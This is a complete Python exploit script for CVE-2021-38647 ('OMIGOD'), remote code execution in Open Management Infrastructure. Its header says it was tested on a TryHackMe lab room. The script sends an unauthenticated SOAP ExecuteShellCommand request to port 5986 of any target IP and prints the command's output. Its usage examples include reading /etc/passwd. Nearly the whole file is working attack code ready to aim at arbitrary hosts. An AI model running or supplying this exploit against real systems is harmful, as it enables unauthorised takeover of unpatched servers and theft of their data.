# CVE-2021-38647 (Open Management Infrastructure Remote Code Execution)

# Tested on "Oh My Webserver" Room (TryHackMe)

# Original POC:
# https://github.com/horizon3ai/CVE-2021-38647

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from xml.etree import ElementTree

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# SOAP payload from https://github.com/midoxnet/CVE-2021-38647
DATA = """<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema">
   <s:Header>
	  <a:To>HTTP://127.0.0.1:5986/wsman/</a:To>
	  <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
	  <a:ReplyTo>
		 <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
	  </a:ReplyTo>
	  <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</a:Action>
	  <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
	  <a:MessageID>uuid:0AB58087-C2C3-0005-0000-000000010000</a:MessageID>
	  <w:OperationTimeout>PT1M30S</w:OperationTimeout>
	  <w:Locale xml:lang="en-us" s:mustUnderstand="false" />
	  <p:DataLocale xml:lang="en-us" s:mustUnderstand="false" />
	  <w:OptionSet s:mustUnderstand="true" />
	  <w:SelectorSet>
		 <w:Selector Name="__cimnamespace">root/scx</w:Selector>
	  </w:SelectorSet>
   </s:Header>
   <s:Body>
	  <p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
		 <p:command>{}</p:command>
		 <p:timeout>0</p:timeout>
	  </p:ExecuteShellCommand_INPUT>
   </s:Body>
</s:Envelope>
"""

##########################################################
#	FUNCTIONS
##########################################################

def exploit(s, target, command):
	headers = {'Content-Type': 'application/soap+xml;charset=UTF-8'}
	r = s.post(f'https://{target}:5986/wsman', headers=headers, data=DATA.format(command), verify=False)
	output = re.search('<p:StdOut>(.*)</p:StdOut>', r.text)
	error = re.search('<p:StdErr>(.*)</p:StdErr>', r.text)
	if output:
		if output.group(1):
			print(output.group(1).rstrip('&#10;').replace('&#10;', """
"""))
	if error:
		if error.group(1):
			print(error.group(1).rstrip('&#10;').replace('&#10;', """
"""))

def show_usage():
	print('[+] Usage: %s <TARGET_IP> <COMMAND>' % sys.argv[0])
	print('[+] Example: %s 10.10.10.10 "id"' % sys.argv[0])
	print('[+] Example: %s 172.17.0.1 "cat /etc/passwd"' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Open Management Infrastructure Remote Code Execution "OMIGOD"\n')
	try:
		target = sys.argv[1].strip()
		command = sys.argv[2].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.verify = False
	try:
		exploit(s, target, command)
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
